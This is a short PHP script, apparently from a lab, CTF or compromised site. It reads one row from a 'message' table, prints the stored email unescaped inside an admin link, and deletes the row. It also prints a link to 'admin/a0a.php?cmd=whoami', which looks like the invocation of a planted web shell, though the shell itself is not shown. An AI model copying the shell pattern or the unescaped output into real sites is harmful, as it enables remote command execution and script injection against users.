<?php
include("local.php");
include("../conn.php");
$sql = "select * from message limit 1";
echo "<br />";
echo '<a href="admin/a0a.php?cmd=whoami">';
$query = mysqli_query($conn,$sql);

if($query) {
	$row = mysqli_fetch_assoc($query);
	if($row) {
		echo '<a href="admin/validate.php">' . $row['email'] . '</a>';
		$id = $row['id'];
		mysqli_query($conn, "delete from message where id=$id");
	}
}
?>
